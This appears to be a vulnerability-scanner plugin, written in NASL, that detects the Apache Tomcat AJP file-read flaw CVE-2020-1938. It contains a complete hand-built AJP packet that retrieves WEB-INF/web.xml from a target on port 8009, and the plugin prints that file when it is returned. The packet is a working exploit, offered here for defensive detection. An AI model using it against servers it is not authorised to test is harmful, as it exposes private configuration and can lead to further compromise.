include("compat.inc");

if (description)
{
  script_id(51799181);
  script_version("1.3");
  script_cve_id("CVE-2020-1938");
  script_cvs_date("Date: 2020/02/20");
  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_name(english:"Apache Tomcat Ajp protocol Web directory arbitrary file read");
  script_summary(english:"Apache Tomcat Ajp protocol Web directory arbitrary file read");
  script_set_attribute(attribute:"description", value:"On February 20, the National Information Security Vulnerability Sharing Platform (CNVD) released the Apache Tomcat File Containment Vulnerability (CNVD-2020-10487 / CVE-2020-1938). The vulnerability is caused by a defect in the Tomcat AJP protocol. An attacker can use this vulnerability to read arbitrary files under the server webapp by constructing specific parameters. If the target server also has a file upload function, the attacker can further implement remote code execution. Currently, the manufacturer has released a new version to complete the bug fix.");
  script_set_attribute(attribute:"solution", value:"Currently the official has fixed the vulnerability in the latest version, please affected users upgrade the version as soon as possible for protection, the official download link: Apache Tomcat 7.0.100 http://tomcat.apache.org/download-70.cgi; Apache Tomcat 8.5.51 http://tomcat.apache.org/download-80.cgi; Apache Tomcat 9.0.31 http://tomcat.apache.org/download-90.cgi;");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"plugin_publication_date", value: "2020/02/20");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"asset_inventory", value:"True");
  script_end_attributes();
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_dependencies("find_service1.nasl","httpver.nasl");
  script_require_ports("Services/ajp13", 8007, 8009);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");

if (thorough_tests && !get_kb_item("global_settings/disable_service_discovery") )
{
  port = get_kb_item("Services/ajp13");
  if (!port) exit(0);
}
else port = 8009;
if (!get_tcp_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


strreq = raw_string(
  0x12, 0x34, 0x01, 0x90, 0x02, 0x02, 0x00, 0x08,
  0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31,
  0x00, 0x00, 0x05, 0x2f, 0x61, 0x73, 0x64, 0x66,
  0x00, 0x00, 0x0e, 0x31, 0x37, 0x32, 0x2e, 0x31,
  0x38, 0x2e, 0x32, 0x35, 0x33, 0x2e, 0x32, 0x32,
  0x35, 0x00, 0xff, 0xff, 0x00, 0x0e, 0x31, 0x37,
  0x32, 0x2e, 0x31, 0x38, 0x2e, 0x32, 0x35, 0x33,
  0x2e, 0x32, 0x32, 0x35, 0x00, 0x00, 0x50, 0x00,
  0x00, 0x09, 0xa0, 0x06, 0x00, 0x0a, 0x6b, 0x65,
  0x65, 0x70, 0x2d, 0x61, 0x6c, 0x69, 0x76, 0x65,
  0x00, 0x00, 0x0f, 0x41, 0x63, 0x63, 0x65, 0x70,
  0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61,
  0x67, 0x65, 0x00, 0x00, 0x0e, 0x65, 0x6e, 0x2d,
  0x55, 0x53, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d,
  0x30, 0x2e, 0x35, 0x00, 0xa0, 0x08, 0x00, 0x01,
  0x30, 0x00, 0x00, 0x0f, 0x41, 0x63, 0x63, 0x65,
  0x70, 0x74, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64,
  0x69, 0x6e, 0x67, 0x00, 0x00, 0x13, 0x67, 0x7a,
  0x69, 0x70, 0x2c, 0x20, 0x64, 0x65, 0x66, 0x6c,
  0x61, 0x74, 0x65, 0x2c, 0x20, 0x73, 0x64, 0x63,
  0x68, 0x00, 0x00, 0x0d, 0x43, 0x61, 0x63, 0x68,
  0x65, 0x2d, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f,
  0x6c, 0x00, 0x00, 0x09, 0x6d, 0x61, 0x78, 0x2d,
  0x61, 0x67, 0x65, 0x3d, 0x30, 0x00, 0xa0, 0x0e,
  0x00, 0x07, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c,
  0x61, 0x00, 0x00, 0x19, 0x55, 0x70, 0x67, 0x72,
  0x61, 0x64, 0x65, 0x2d, 0x49, 0x6e, 0x73, 0x65,
  0x63, 0x75, 0x72, 0x65, 0x2d, 0x52, 0x65, 0x71,
  0x75, 0x65, 0x73, 0x74, 0x73, 0x00, 0x00, 0x01,
  0x31, 0x00, 0xa0, 0x01, 0x00, 0x09, 0x74, 0x65,
  0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x00,
  0xa0, 0x0b, 0x00, 0x0e, 0x31, 0x37, 0x32, 0x2e,
  0x31, 0x38, 0x2e, 0x32, 0x35, 0x33, 0x2e, 0x32,
  0x32, 0x35, 0x00, 0x0a, 0x00, 0x21, 0x6a, 0x61,
  0x76, 0x61, 0x78, 0x2e, 0x73, 0x65, 0x72, 0x76,
  0x6c, 0x65, 0x74, 0x2e, 0x69, 0x6e, 0x63, 0x6c,
  0x75, 0x64, 0x65, 0x2e, 0x72, 0x65, 0x71, 0x75,
  0x65, 0x73, 0x74, 0x5f, 0x75, 0x72, 0x69, 0x00,
  0x00, 0x01, 0x2f, 0x00, 0x0a, 0x00, 0x1f, 0x6a,
  0x61, 0x76, 0x61, 0x78, 0x2e, 0x73, 0x65, 0x72,
  0x76, 0x6c, 0x65, 0x74, 0x2e, 0x69, 0x6e, 0x63,
  0x6c, 0x75, 0x64, 0x65, 0x2e, 0x70, 0x61, 0x74,
  0x68, 0x5f, 0x69, 0x6e, 0x66, 0x6f, 0x00, 0x00,
  0x0f, 0x57, 0x45, 0x42, 0x2d, 0x49, 0x4e, 0x46,
  0x2f, 0x77, 0x65, 0x62, 0x2e, 0x78, 0x6d, 0x6c,
  0x00, 0x0a, 0x00, 0x22, 0x6a, 0x61, 0x76, 0x61,
  0x78, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x6c, 0x65,
  0x74, 0x2e, 0x69, 0x6e, 0x63, 0x6c, 0x75, 0x64,
  0x65, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x6c, 0x65,
  0x74, 0x5f, 0x70, 0x61, 0x74, 0x68, 0x00, 0x00,
  0x01, 0x2f, 0x00, 0xff);

send(socket:soc, data:strreq);

res_1 = recv(socket:soc, length:4);
if (strlen(res_1) == 4 && getword(blob:res_1, pos:0) == 0x4142 &&getword(blob:res_1, pos:2) > 0)
  {
    res_2 = recv(socket:soc, length:20000);
    if (strlen(res_2) > 100 && '<?xml version="1.0"' >< res_2 && "xmlns:xsi=" >< res_2 && "</web-app>" >< res_2)
    {
		security_note(port:port, data:res_2);
    }
  }
close(soc);
exit(0);
